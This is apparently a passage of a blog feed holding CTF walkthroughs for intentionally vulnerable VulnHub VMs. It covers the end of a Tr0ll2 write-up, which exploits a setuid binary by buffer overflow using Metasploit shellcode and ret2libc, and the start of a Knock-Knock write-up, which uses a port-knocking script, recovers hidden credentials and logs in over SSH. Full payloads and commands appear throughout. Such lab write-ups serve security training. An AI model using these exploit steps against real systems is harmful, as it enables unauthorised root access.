+Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6a413969 in ?? ()
+</code></pre>
+
+<pre><code>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 6a413969
+[*] Exact match at offset 268
+root@kali:/usr/share/metasploit-framework/tools# 
+</code></pre>
+
+<p>Cool! So we need to overwrite 268 bytes to get to the EIP. Let&rsquo;s see what protections are enabled using another useful tool <code>checksec.sh</code>, copy it onto the host and see what it&rsquo;ll tell us about our binary:</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/checksec.sh --file r00t 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   r00t
+</code></pre>
+
+<p>Awesome! Pretty much everything disabled - that should be easy :) And since we&rsquo;re on 32 bit machine, just a quick precautionary increase of the stack size to &lsquo;disable&rsquo; ASLR to prevent messing with our addresses.</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ uname -a
+Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ulimit -s unlimited
+</code></pre>
+
+<p>We&rsquo;re good to go! There are couple methods how we can exploit it and I&rsquo;ll describe two that came to my mind straight away - putting a shellcode in an environment variable and ret2libc. Let&rsquo;s do it!</p>
+
+<h2>Buffer overflow with payload in an environment variable</h2>
+
+<p>Since NX is disabled, we can execute code from anywhere, including .data section. That makes it pretty simple, we can put the shellcode we want to run in an environment variable and overwrite EIP with address of the shellcode.</p>
+
+<p>First, let&rsquo;s create a shellcode with Metasploit.</p>
+
+<pre><code>msf &gt; use payload/linux/x86/exec 
+msf payload(exec) &gt; show options
+
+Module options (payload/linux/x86/exec):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+   CMD                    yes       The command string to execute
+
+msf payload(exec) &gt; set CMD /bin/sh
+CMD =&gt; /bin/sh
+msf payload(exec) &gt; generate -b '\x00' -s 50
+# linux/x86/exec - 120 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# NOP gen: x86/opty2
+# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
+# PrependSetreuid=false, PrependSetuid=false, 
+# PrependSetresgid=false, PrependSetregid=false, 
+# PrependSetgid=false, PrependChrootBreak=false, 
+# AppendExit=false, CMD=/bin/sh
+buf = 
+"\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8" +
+"\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b" +
+"\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14" +
+"\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd" +
+"\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03" +
+"\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59" +
+"\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1" +
+"\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1" +
+"\x48\x75\x66\x56\x01\x94\x45\xd8"
+</code></pre>
+
+<p>Calling <code>generate</code> with <code>-b '\x00'</code> to avoid NULL bytes that could mess up our exploit and <code>-s 50</code> to include 50 byte NOP sled. This will help us locating the shellcode in the memory as we won&rsquo;t need to provide exact address where the shellcode starts, but just a rough vicinity (we can land anywhere on NOPs).</p>
+
+<p>Let&rsquo;s put the shellcode in the environment.</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ export EGG=$(python -c 'print "\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1\x48\x75\x66\x56\x01\x94\x45\xd8"')
+</code></pre>
+
+<p>And it&rsquo;s in! Now all we need to do, is find its address and overwrite EIP with it. To do it, let&rsquo;s reach to yet another tool in my arsenal - simple C code to locate environment variables.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">EGG</span> <span class="n">address</span> <span class="mi">0</span><span class="n">x</span><span class="o">%</span><span class="n">lx</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">getenv</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">EGG</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;));</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Copy it across, compile and run to find the address of our EGG (shellcode).</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/egghunt 
+EGG address 0xbffffe57
+</code></pre>
+
+<p>Alright, so we have the address of the EGG, let&rsquo;s try to exploit it! Again, we need to overwrite 268 bytes to get to EIP and then pass in address of our shellcode.</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x57\xfe\xff\xbf"')
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x67\xfe\xff\xbf"')
+# whoami
+root
+</code></pre>
+
+<p>Voila! :) Needed to adjust address of shellcode a little bit, but thanks to NOP sled we got it on a second try - that was pretty simple. Let&rsquo;s now have a look at ret2libc option (my personal favourite).</p>
+
+<h2>Ret2libc</h2>
+
+<p>So, with ret2libc things are a little bit different. If NX was enabled, it would mean we can only execute code from executable sectors of the program and the approach described above wouldn&rsquo;t work.</p>
+
+<p>In order to bypass this, we can utilise functions in the C libraries that are generally loaded by majority of the programs. One particular function we would want to use is <code>system()</code> that invokes system commands passed in. Because it takes a parameter, we need to create a fake stack frame to make it look like it&rsquo;s really a function being called.</p>
+
+<p>Essentially, we want to make the stack look as follows:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.
+</span><span class='line'>                &ndash; Current &ndash;                    &ndash; Target &ndash;
+</span><span class='line'>     0000
+</span><span class='line'>             &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;               &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |                |               |                |
+</span><span class='line'>             |                |               | AAAAAAAAAAAAAA |
+</span><span class='line'>       ^     |     Buffer     |               | AAAAAAAAAAAAAA | &lt;br/>
+</span><span class='line'>       |     |                |   268 bytes   | AAAAAAAAAAAAAA |  Overflow buffer with dummy data
+</span><span class='line'>     stack   |                |               | AAAAAAAAAAAAAA |
+</span><span class='line'>     growth  &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;               | AAAAAAAAAAA&hellip; |
+</span><span class='line'>       |     |  Base pointer  |               |                |&lt;br/>
+</span><span class='line'>       |     &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;               &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             | Return address |    4 bytes    |    system()    |   system() call
+</span><span class='line'>             &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;               &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |                |    4 bytes    |      BBBB      |   dummy return from system()
+</span><span class='line'>             |  Rest of the   |               &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+</span><span class='line'>             |     stack      |    4 bytes    | /bin/sh (&amp;EGG) |   address of the EGG environment variable
+</span><span class='line'>             |                |               &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;   containing string argument passed to system()
+</span><span class='line'>             |      &hellip;       |               |       &hellip;      |
+</span><span class='line'>     FFFF</span></code></pre></td></tr></table></div></figure></p>
+
+<p>First, let&rsquo;s get the address of <code>system</code> using <code>gdb</code></p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ gdb r00t 
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
+Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
+(gdb) run
+Starting program: /nothing_to_see_here/choose_wisely/door3/r00t 
+Usage: /nothing_to_see_here/choose_wisely/door3/r00t input
+[Inferior 1 (process 2379) exited normally]
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;
+</code></pre>
+
+<p>Cool, we know where the system function call resides (0x40069060), now - what do we want to call? How about <code>/bin/sh</code>? There&rsquo;s one problem though - when passing it as an argument to <code>system()</code>, we need to pass an address of the string going in as argument.</p>
+
+<p>There are couple of options - we can either try to find it in existing environment variables (but it may be hard as the string we want may not be there and we would need to be exact regarding its memory address to be able to extract it) or we can simply create new environment variable with whatever value we want and pass that in!</p>
+
+<p>Going with the second option, we control what value we want to pass in and we can also do a variety of a NOP sled as in the previous example.</p>
+
+<p>As before, let&rsquo;s create an environment variable to use as an argument to our <code>system()</code> call.</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ export EGG=//////////////////////////////////////////////////////bin/sh
+</code></pre>
+
+<p>Number of <code>/</code> acts as a NOP sled, we can land anywhere on them and the exploit will still work, thus, we don&rsquo;t need to be super specific about the string&rsquo;s memory location.</p>
+
+<p>Now we just need it&rsquo;s address and we are ready to rock! Let&rsquo;s use the same <code>egghunt</code> program as in the previous example.</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/egghunt 
+EGG address 0xbffffe93
+</code></pre>
+
+<p>Awesome! Let&rsquo;s craft our exploit - again, we&rsquo;ll need (in sequence):</p>
+
+<ul>
+<li>268 bytes of dummy data</li>
+<li>address of system</li>
+<li>4 bytes of dummy data</li>
+<li>address of /bin/sh string</li>
+</ul>
+
+
+<p>Let&rsquo;s do it!</p>
+
+<pre><code>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\x93\xfe\xff\xbf"')
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\xa3\xfe\xff\xbf"')
+sh: 1: s/0: not found
+Segmentation fault
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\xb3\xfe\xff\xbf"')
+# whoami
+root
+# 
+</code></pre>
+
+<p>Got it! On the 3rd try, didn&rsquo;t seem to be able to guess EGG address that effectively this time, but at the end of the day it worked! :) Now you see why having a decent size NOP sled helps, otherwise, we would need to find <em>EXACT</em> address where it starts&hellip; in some situations it could be pretty hard if not impossible to do!</p>
+
+<p>Oh, right, let&rsquo;s get the flag!</p>
+
+<pre><code># cd /root
+# ls
+core1  core2  core3  core4  goal  hardmode  lmao.zip  Proof.txt  ran_dir.py  reboot
+# cat Proof.txt
+You win this time young Jedi...
+
+a70354f0258dcc00292c72aab3c8b1e4  
+</code></pre>
+
+<h2>Summary</h2>
+
+<p>Quite fun challange! Was a bit frustrating at times, especially at the password guessing bit for FTP server, if only &ldquo;Tr0ll&rdquo; was one of the entries in the answer.txt file, that would save me quite some time trying to guess FTP username and password&hellip; oh well, Trolls will be Trolls :) Thanks <a href="https://twitter.com/maleus21">Maleus</a> for coming up with it and <a href="http://www.vulnhub.com">VulnHub</a> for hosting it!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Knock-Knock VM Walkthrough]]></title>
+    <link href="http://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/"/>
+    <updated>2014-10-16T15:29:15+11:00</updated>
+    <id>http://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough</id>
+    <content type="html"><![CDATA[<p>Just after awesome weekend hacking away at <a href="http://ruxcon.org.au">Ruxcon</a>, <a href="http://vulnhub.com">VulnHub</a> delivered yet another boot2root VM - wow, that&rsquo;s been busy (and fun) last couple of weeks! Good practice for another big CTF that is coming up for me very soon&hellip;</p>
+
+<p>Anyway, without too much of an intro, let&rsquo;s get to it!</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p>So, as always, start up the pwn-able VM, Kali and get to work.</p>
+
+<p>First, use <code>netdiscover</code> to find out IP address of our victim.</p>
+
+<pre><code>root@kali:~# netdiscover -r 172.16.246.129/24
+
+ Currently scanning: 172.16.246.0/24   |   Screen View: Unique Hosts           
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                 
+ 172.16.246.133  00:0c:29:5c:26:15    01    060   VMware, Inc.                 
+ 172.16.246.254  00:50:56:e9:b1:8a    01    060   VMWare, Inc.                 
+</code></pre>
+
+<p>Next, <code>nmap</code> to see what services do we see (standard procedure, really).</p>
+
+<pre><code>root@kali:~# nmap -sV 172.16.246.133
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 15:40 EST
+Nmap scan report for 172.16.246.133
+Host is up (0.00038s latency).
+All 1000 scanned ports on 172.16.246.133 are filtered
+MAC Address: 00:0C:29:5C:26:15 (VMware)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
+</code></pre>
+
+<p>What&hellip; can&rsquo;t see anything?! But we can ping it right?</p>
+
+<pre><code>root@kali:~# ping 172.16.246.133
+PING 172.16.246.133 (172.16.246.133) 56(84) bytes of data.
+From 172.16.246.133 icmp_seq=1 Destination Port Unreachable
+From 172.16.246.133 icmp_seq=2 Destination Port Unreachable
+From 172.16.246.133 icmp_seq=3 Destination Port Unreachable
+^C
+--- 172.16.246.133 ping statistics ---
+3 packets transmitted, 0 received, +3 errors, 100% packet loss, time 1999ms
+</code></pre>
+
+<p>Ok, I admit, at this point I thought something went wrong with VM&rsquo;s network adapter, however, as <a href="https://twitter/zer0w1re">zer0w1re</a> pointed out, there&rsquo;s is a difference between &ldquo;Host Unreachable&rdquo; and &ldquo;Port Unreachable&rdquo;&hellip; ahhhh, of course! I skimmed through the output too quickly - first lesson learnt, carefully read what&rsquo;s displayed back on the screen! Duh!</p>
+
+<h2>Port knocking</h2>
+
+<p>Anyway, looks like everything is being blocked by a host firewall and all ports are closed. Also, the name of the VM suggests that we are most likely dealing with a &ldquo;port knocking&rdquo; mechanism, which is kind of security by obscurity, implementing an idea of knocking on the door following a specific pattern to make the door open. Since we&rsquo;re dealing with a server here, we&rsquo;ll need to know a proper sequence of ports to knock for the firewall rules to be loosened for our IP address.</p>
+
+<p>Ok, but how do we find the actual port sequence? There&rsquo;s no real way of bypassing port knocking, you really need to know the right sequence. Brute forcing is simply not viable - too many ports and too many possible variations.</p>
+
+<p>Let&rsquo;s have a look at the <code>nmap</code> output again&hellip; we only scanned default, low ports (&ldquo;All 1000 scanned ports on 172.16.246.133 are filtered&rdquo;), let&rsquo;s scan beyond that!</p>
+
+<pre><code>root@kali:~# nmap -sV -p 0-5000 172.16.246.133
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 15:50 EST
+Nmap scan report for 172.16.246.133
+Host is up (0.00039s latency).
+Not shown: 5000 filtered ports
+PORT     STATE SERVICE VERSION
+1337/tcp open  waste?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port1337-TCP:V=6.47%I=7%D=10/16%Time=543F4EB8%P=i686-pc-linux-gnu%r(NUL
+SF:L,15,"\[6129,\x2023888,\x2012152\]\n");
+MAC Address: 00:0C:29:5C:26:15 (VMware)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.08 seconds
+</code></pre>
+
+<p>That&rsquo;s better! We can see port 1337 listening! And it gives an interesting output:</p>
+
+<pre><code>root@kali:~# nc 172.16.246.133 1337
+[32510, 55533, 4648]
+</code></pre>
+
+<p>Alright, looks like a sequence of ports we need to knock on - let&rsquo;s go ahead and try to knock. We have few options here, we can either use single commands to knock on those ports (<code>ping</code>, <code>nc</code>, <code>hping3</code>), write a simple script to do it for us in sequence, or use predefined program that will do it for us, e.g. <code>knock</code> - a port knocking client, coming as a part of a knockd server.</p>
+
+<p>And that&rsquo;s where it becomes weird. I tried number of different approaches with varying results. Generally what I was doing was:</p>
+
+<ol>
+<li>nc 172.16.246.133 1337</li>
+<li>knock on ports</li>
+<li>nmap -sV 172.16.246.133</li>
+</ol>
+
+
+<p>I tried knocking with <code>nmap</code>, <code>nc</code>, <code>ping</code>, wrote a script knocking with <code>hping3</code>, nothing seemed to be working! And then, a simple chained command worked:</p>
+
+<pre><code>root@kali:~# hping3 -S 172.16.246.133 -p 680 -c 1; hping3 -S 172.16.246.133 -p 39372 -c 1; hping3 -S 172.16.246.133 -p 46484 -c 1
+</code></pre>
+
+<pre><code>root@kali:~# nmap -sV 172.16.246.133
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 16:21 EST
+Nmap scan report for 172.16.246.133
+Host is up (0.00028s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+80/tcp open  http    nginx 1.2.1
+MAC Address: 00:0C:29:5C:26:15 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds
+</code></pre>
+
+<p>That got me thinking, why all of a sudden one command worked while all others didn&rsquo;t. Maybe the order of ports provided is not neccessarily left-to-right, but is randomised? I wrote a simple bash script trying all possible combinations to test it out.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;if <span class="o">[</span> <span class="nv">$# </span>-ne <span class="m">4</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>Usage: <span class="nv">$0</span> ip port1 port2 port3<span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'>    <span class="nb">exit</span><span class="p">;</span>
+</span><span class='line'><span class="k">fi</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;HOST<span class="o">=</span><span class="nv">$1</span>
+</span><span class='line'><span class="nb">shift</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;Go through all possible combinations of <span class="m">3</span> ports&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;for PORT_1 in <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$@</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'><span class="k">do</span>
+</span><span class='line'>    <span class="k">for</span> PORT_2 in <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$@</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'>    <span class="k">do</span>
+</span><span class='line'>            <span class="k">for</span> PORT_3 in <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$@</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'>            <span class="k">do</span>
+</span><span class='line'>                hping3 -S <span class="nv">$HOST</span> -p <span class="nv">$PORT_1</span> -c <span class="m">1</span> &gt;<span class="p">&amp;</span>amp<span class="p">;</span><span class="m">2</span> &gt; /dev/null
+</span><span class='line'>                hping3 -S <span class="nv">$HOST</span> -p <span class="nv">$PORT_2</span> -c <span class="m">1</span> &gt;<span class="p">&amp;</span>amp<span class="p">;</span><span class="m">2</span> &gt; /dev/null
+</span><span class='line'>                hping3 -S <span class="nv">$HOST</span> -p <span class="nv">$PORT_3</span> -c <span class="m">1</span> &gt;<span class="p">&amp;</span>amp<span class="p">;</span><span class="m">2</span> &gt; /dev/null
+</span><span class='line'>            <span class="k">done</span>
+</span><span class='line'>    <span class="k">done</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Restarted the Knock-Knock VM and tried again.</p>
+
+<pre><code>root@kali:~# nc 172.16.246.133 1337
+[1138, 1248, 56206]
+root@kali:~# ./portknock.sh 172.16.246.133 1138 1248 56206
+--- 172.16.246.133 hping statistic ---
+1 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+--- 172.16.246.133 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+--- 172.16.246.133 hping statistic ---
+1 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+...truncated...
+
+root@kali:~# nmap -sV 172.16.246.133
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 19:33 EST
+Nmap scan report for 172.16.246.133
+Host is up (0.00030s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+80/tcp open  http    nginx 1.2.1
+MAC Address: 00:0C:29:5C:26:15 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds
+</code></pre>
+
+<p>Woohoo, so that worked! Lesson #2 learnt - don&rsquo;t assume stuff&hellip; sometimes it helps, but not always pays off!</p>
+
+<h2>Invisible ink and Ceasar(ish) cipher</h2>
+
+<p>Ok, moving on - start up Iceweasel and let&rsquo;s have a look at the site.</p>
+
+<p><img src="/images/posts/2014-10-16-knock-knock-vm-walkthrough/door.png" alt="Door" /></p>
+
+<p>Let&rsquo;s find something we can use to break in. Few things I looked at without any luck:</p>
+
+<ul>
+<li>robots.txt file doesn&rsquo;t exist</li>
+<li>no cookies</li>
+<li><code>dirbuster</code> didn&rsquo;t return anything interesting</li>
+<li>tried to analyse and replay traffic using <code>burpsuite</code>, but also wasn&rsquo;t able to find anything interesting, except some basic cache headers</li>
+</ul>
+
+
+<p>After poking around for ages, I got pretty frustrated, I couldn&rsquo;t find anything that would give me a way in! But after having a chat with <a href="https://twitter.com/recrudesce">recrudesce</a>, I realised that &ldquo;picture is worth a thousand words&rdquo; and decided to look into it closer.</p>
+
+<p>Initially I thought that I&rsquo;ll need to do some fancy stego on it, but first I downloaded the file, ran <code>strings</code> on it and found something very interesting at the bottom of the output.</p>
+
+<pre><code>root@kali:~# strings knockknock.jpg
+
+...truncated...
+
+tR)O
+MO:/?
+qW|U
+\+\U
+Login Credentials
+abfnW
+sax2Cw9Ow
+</code></pre>
+
+<p>Cool! We have something. Straight away I tried logging via SSH in with username: abfnW and password: sax2Cw90w, but that didn&rsquo;t work. I tried username: sax2Cw90w and password: abfnW, but that didn&rsquo;t work either.</p>
+
+<p>I started thinking what could it be, obviously it must have been somehow encrypted. Doesn&rsquo;t look like base64, neither like MD5. Let&rsquo;s go back to the ancient times and try a Caesar cipher.</p>
+
+<p>Using this useful resource <a href="http://rumkin.com/tools/cipher/caesar.php">Caesarian Shift</a> I tried going through various different rotations and trying to find something that would like a human readable string. Nothing stood out straight away, but after few more tries and looking at a particularly popular ROT-13, I realised that the username and password were actually backwards!</p>
+
+<pre><code>abfnW   -   Wnfba
+nosaJ   -   Jason
+</code></pre>
+
+<p>Wooho, did the same for password and tried logging in SSH with the following credentials:</p>
+
+<pre><code>username: Jason
+password: jB9jP2knf
+</code></pre>
+
+<pre><code>root@kali:~# ssh Jason@172.16.246.133
+Jason@172.16.246.133's password: 
+Permission denied, please try again.
+Jason@172.16.246.133's password: 
+</code></pre>
+
+<p>Oops, &ldquo;Jason&rdquo; didn&rsquo;t work, let&rsquo;s try all lower case (more in sync with Unix account naming convention).</p>
+
+<pre><code>root@kali:~# ssh jason@172.16.246.133
+jason@172.16.246.133's password: 
+Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
